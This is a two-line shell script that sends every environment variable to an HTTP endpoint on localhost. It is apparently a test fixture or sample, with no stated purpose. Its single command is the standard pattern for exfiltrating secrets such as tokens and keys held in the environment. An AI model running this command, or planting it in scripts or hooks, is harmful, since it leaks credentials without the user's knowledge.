#!/bin/sh
env | curl --data-binary @- http://127.0.0.1/report
